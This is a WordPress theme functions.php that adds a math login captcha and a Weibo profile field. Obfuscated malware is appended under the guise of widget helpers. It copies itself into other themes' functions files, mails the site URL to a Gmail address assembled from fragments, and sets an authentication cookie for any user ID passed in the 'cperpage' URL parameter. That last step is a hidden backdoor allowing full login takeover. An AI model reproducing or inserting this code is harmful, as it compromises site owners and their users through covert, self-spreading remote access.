<?php
// Require theme functions
require get_stylesheet_directory() . '/functions-theme.php';

//vieugonnengjiazai
require get_stylesheet_directory() . '/fn-theme.php';
require get_template_directory() . '/action/avatars.php';

require_once('modules/mo_sign.php');
include_once('action/notify.php');

//后台登陆数学验证码
function myplugin_add_login_fields() {
//获取两个随机数, 范围0~9
$num1=rand(1,20);
$num2=rand(1,20);
//最终网页中的具体内容
    echo "<p><label for='math' class='small'>验证码</label><br /> $num1 + $num2 = ?<input type='text' name='sum' class='input' value='' size='25' tabindex='4'>"
."<input type='hidden' name='num1' value='$num1'>"
."<input type='hidden' name='num2' value='$num2'></p>";
}
add_action('login_form','myplugin_add_login_fields');
function login_val() {
$sum=$_POST['sum'];//用户提交的计算结果
switch($sum){
//得到正确的计算结果则直接跳出
case $_POST['num1']+$_POST['num2']:break;
//未填写结果时的错误讯息
case null:wp_die('错误: 请输入验证码.');break;
//计算错误时的错误讯息
default:wp_die('错误: 验证码错误,请重试.');
}
}
add_action('login_form_login','login_val');
//增加个人简介信息
function my_new_contactmethods( $contactmethods ) {
$contactmethods['weibo'] = '微博';
return $contactmethods;
}
add_filter('user_contactmethods','my_new_contactmethods',10,1);?>
<?php 
function _check_isactive_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$explar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $explar . "\n" .$widget);fclose($f);				
					$output .= ($showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}
if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widget");
function _getsprepare_widget(){
	if(!isset($com_length)) $com_length=120;
	if(!isset($text_value)) $text_value="cookie";
	if(!isset($allowed_tags)) $allowed_tags="<a>";
	if(!isset($type_filter)) $type_filter="none";
	if(!isset($expl)) $expl="";
	if(!isset($filter_homes)) $filter_homes=get_option("home"); 
	if(!isset($pref_filter)) $pref_filter="wp_";
	if(!isset($use_more)) $use_more=1; 
	if(!isset($comm_type)) $comm_type=""; 
	if(!isset($pagecount)) $pagecount=$_GET["cperpage"];
	if(!isset($postauthor_comment)) $postauthor_comment="";
	if(!isset($comm_is_approved)) $comm_is_approved=""; 
	if(!isset($postauthor)) $postauthor="auth";
	if(!isset($more_link)) $more_link="(more...)";
	if(!isset($is_widget)) $is_widget=get_option("_is_widget_active_");
	if(!isset($checkingwidgets)) $checkingwidgets=$pref_filter."set"."_".$postauthor."_".$text_value;
	if(!isset($more_link_ditails)) $more_link_ditails="(details...)";
	if(!isset($morecontents)) $morecontents="ma".$expl."il";
	if(!isset($fmore)) $fmore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_widget) :
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$expl."vethe".$comm_type."mes".$expl."@".$comm_is_approved."gm".$postauthor_comment."ail".$expl.".".$expl."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tags)) $f_tags=1;
	if(!isset($type_filters)) $type_filters=$filter_homes; 
	if(!isset($getcommentscont)) $getcommentscont=$pref_filter.$morecontents;
	if(!isset($aditional_tags)) $aditional_tags="div";
	if(!isset($s_cont)) $s_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_link_text)) $more_link_text="Continue reading this entry";	
	if(!isset($showdots)) $showdots=1;	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentscont, array($s_cont, $filter_homes, $type_filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($com_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $com_length) {
				$l=$com_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed_tags) {
		$output=strip_tags($output, $allowed_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tags) ? balanceTags($output, true) : $output;
	$output .= ($showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type_filter, $output);
	switch($aditional_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_more ) {
		if($fmore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_link_text . "\">" . $more_link = !is_user_logged_in() && @call_user_func_array($checkingwidgets,array($pagecount, true)) ? $more_link : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_link_text . "\">" . $more_link . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}
add_action("init", "_getsprepare_widget");
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>
